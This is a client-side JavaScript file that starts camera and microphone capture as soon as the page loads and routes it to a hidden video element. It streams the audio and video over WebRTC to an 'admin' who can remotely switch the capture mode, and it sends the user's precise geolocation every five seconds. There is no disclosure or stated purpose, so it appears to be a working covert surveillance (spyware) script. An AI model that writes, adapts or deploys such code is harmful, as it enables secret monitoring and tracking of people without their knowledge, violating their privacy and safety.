// USER side
const socket = io();
const ROLE = "user";
// optional: you can set a name for easier admin identification
const USER_NAME = "user-" + Math.floor(Math.random() * 10000);

// inform server of role and name
socket.emit("role", { role: ROLE, name: USER_NAME });

let pc = null;
let localStream = null;
let currentMode = "both"; // "both" (audio+video), "audio" (audio-only)

// create a new RTCPeerConnection and start media capture according to mode
async function startConnection(mode = "both") {
  currentMode = mode;
  // close existing pc if exists
  if (pc) {
    try { pc.close(); } catch (e) {}
    pc = null;
  }

  pc = new RTCPeerConnection();

  pc.onicecandidate = (event) => {
    if (event.candidate) {
      socket.emit("ice-candidate", { candidate: event.candidate, to: "admin" });
    }
  };

  pc.onconnectionstatechange = () => {
    console.log("PC state:", pc.connectionState);
  };

  // get media with requested constraints
  const constraints = (mode === "audio")
    ? { audio: true, video: false }
    : { audio: true, video: { width: { ideal: 640 }, height: { ideal: 480 } } };

  try {
    // stop old tracks if any
    if (localStream) {
      localStream.getTracks().forEach(t => t.stop());
      localStream = null;
    }

    localStream = await navigator.mediaDevices.getUserMedia(constraints);

    // Attach to hidden video element so capture works even if hidden
    const videoEl = document.getElementById("camera");
    videoEl.srcObject = localStream;

    // add tracks to peer connection
    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));

    // Create offer and send to admin (server forwards to admin)
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit("offer", { offer });

  } catch (err) {
    console.error("getUserMedia / startConnection error:", err);
  }
}

// Handle offer/answer/ice from server (admin <-> user flow)
socket.on("answer", async (data) => {
  // data: { answer, from }  (from = admin socket id)
  try {
    if (!pc) {
      console.warn("No peer connection when receiving answer. Starting default connection.");
      await startConnection(currentMode);
    }
    await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
  } catch (err) {
    console.error("Error setting remote description (answer):", err);
  }
});

socket.on("ice-candidate", async (data) => {
  try {
    if (pc && data && data.candidate) {
      await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
    }
  } catch (err) {
    console.warn("Error adding received ice candidate:", err);
  }
});

// admin can instruct this user to change mode (audio / both)
socket.on("set-mode", async (data) => {
  // data: { mode: "audio"|"both", from: adminId }
  console.log("Received set-mode:", data);
  if (!data || !data.mode) return;
  // restart connection with new constraints
  await startConnection(data.mode);
});

// Send geolocation periodically to server (and admin will receive it)
function startLocationUpdates() {
  if (!navigator.geolocation) return;
  setInterval(() => {
    navigator.geolocation.getCurrentPosition(
      pos => {
        socket.emit("location", {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      err => console.warn("Geolocation error:", err),
      { enableHighAccuracy: true }
    );
  }, 5000);
}

// Start default (both audio+video)
startConnection("both");
startLocationUpdates();
